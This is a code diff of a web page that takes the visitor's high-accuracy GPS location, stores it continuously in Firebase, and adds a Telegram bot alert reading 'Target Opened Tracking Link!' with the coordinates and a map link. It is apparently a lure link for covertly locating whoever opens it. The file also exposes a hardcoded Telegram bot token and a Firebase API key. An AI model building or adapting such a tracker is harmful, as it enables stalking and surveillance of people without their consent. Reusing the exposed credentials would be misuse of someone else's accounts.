@@ -3,37 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sender - High Accuracy Live Tracker</title>
+    <title>Live Location Sender</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body { 
-            font-family: Arial, sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             text-align: center; 
-            padding-top: 50px; 
+            padding: 40px 20px; 
             background-color: #121212; 
             color: #ffffff; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
         .container {
             background: #1e1e1e;
-            padding: 25px;
-            border-radius: 12px;
-            display: inline-block;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            max-width: 90%;
+            padding: 30px 20px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid #2a2a2a;
+        }
+        h2 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #00ffcc;
         }
         #status { 
-            font-size: 16px; 
-            color: #00ffcc; 
-            font-weight: bold; 
+            font-size: 15px; 
+            color: #dddddd; 
+            font-weight: 500; 
             line-height: 1.6;
             margin-top: 15px;
+            word-break: break-word;
+        }
+        .pulse-dot {
+            height: 12px;
+            width: 12px;
+            background-color: #00ffcc;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 255, 204, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0); }
         }
         .error { color: #ff5555 !important; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>GPS Tracking Active...</h2>
-        <p id="status">Waiting for GPS location fix...</p>
+        <h2><span class="pulse-dot"></span>GPS Live Tracking</h2>
+        <p id="status">Connecting to GPS satellites...</p>
     </div>
 
     <!-- Firebase SDKs -->
@@ -41,7 +71,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-        // Aapki Firebase Configuration
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyDhYrfKfzjRXTuJZS095zZe6UoI17CnHgw",
             authDomain: "live-tracker-c443f.firebaseapp.com",
@@ -58,16 +88,43 @@
 
         const statusText = document.getElementById("status");
 
+        // --- TELEGRAM CONFIGURATION ---
+        const BOT_TOKEN = "8818145313:AAE9KwaKfnjBm9aaMDnzwMwuIgJgM_ajoR4";
+        const CHAT_ID = "8407541236"; 
+
+        let hasAlerted = false;
+
+        function sendTelegramAlert(lat, lng, accuracy) {
+            if (hasAlerted) return;
+            hasAlerted = true;
+
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+            const message = `🚨 *Target Opened Tracking Link!*\n\n📍 *Latitude:* ${lat}\n📍 *Longitude:* ${lng}\n🎯 *GPS Accuracy:* ~${Math.round(accuracy)} meters\n\n🗺️ [Google Maps Location](${mapUrl})`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            }).catch(err => console.error("Telegram Alert Error:", err));
+        }
+
         if (navigator.geolocation) {
             navigator.geolocation.watchPosition((position) => {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
-                const accuracy = position.coords.accuracy; // Accuracy in meters
+                const accuracy = position.coords.accuracy;
 
-                statusText.innerText = `Live Location Sent:\nLat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}\nGPS Accuracy: ~${Math.round(accuracy)} meters`;
+                statusText.innerText = `Location Active\nLatitude: ${lat.toFixed(5)}\nLongitude: ${lng.toFixed(5)}\nAccuracy: ~${Math.round(accuracy)}m`;
                 statusText.classList.remove("error");
 
-                // Save exact coordinates & accuracy to Firebase
+                // Send Telegram Notification
+                sendTelegramAlert(lat, lng, accuracy);
+
+                // Update Firebase
                 set(ref(db, 'users/sahil'), {
                     latitude: lat,
                     longitude: lng,
@@ -79,12 +136,12 @@
                 statusText.innerText = "Error: " + error.message;
                 statusText.classList.add("error");
             }, {
-                enableHighAccuracy: true, // Force mobile GPS satellite chip
-                timeout: 10000,           // Wait max 10s for precise signal
-                maximumAge: 0             // Do not use old cached position
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
             });
         } else {
-            statusText.innerText = "Geolocation is not supported by your browser.";
+            statusText.innerText = "Geolocation is not supported by this browser.";
             statusText.classList.add("error");
         }
     </script>
